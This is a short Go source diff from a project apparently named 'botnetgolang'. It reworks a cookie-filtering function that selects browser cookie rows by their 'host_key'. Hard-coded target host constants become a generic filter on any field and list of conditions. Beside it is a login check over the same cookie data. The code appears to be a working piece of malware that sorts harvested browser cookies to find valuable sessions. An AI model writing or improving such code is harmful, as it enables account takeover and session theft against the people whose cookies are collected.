@@ -2,6 +2,7 @@ package pkg
 
 import (
 	_const "botnetgolang/internal/const"
+	"fmt"
 	"strings"
 )
 
@@ -19,12 +20,15 @@ func CheckLogin(cookie []map[string]interface{}) interface{} {
 	return nil
 }
 
-func FilterCookieConditions(cookie []map[string]interface{}) []map[string]interface{} {
+func FilterConditions(cookie []map[string]interface{}, conditions []interface{}, target string) []map[string]interface{} {
 	var results []map[string]interface{}
 
 	for _, row := range cookie {
-		if row["host_key"] == _const.Cggg || row["host_key"] == _const.Clll || row["host_key"] == _const.Cfff {
-			results = append(results, row)
+		for _, condition := range conditions {
+			if strings.Contains(fmt.Sprintf("%v", row[target]), fmt.Sprintf("%v", condition)) {
+				results = append(results, row)
+				break
+			}
 		}
 
 	}
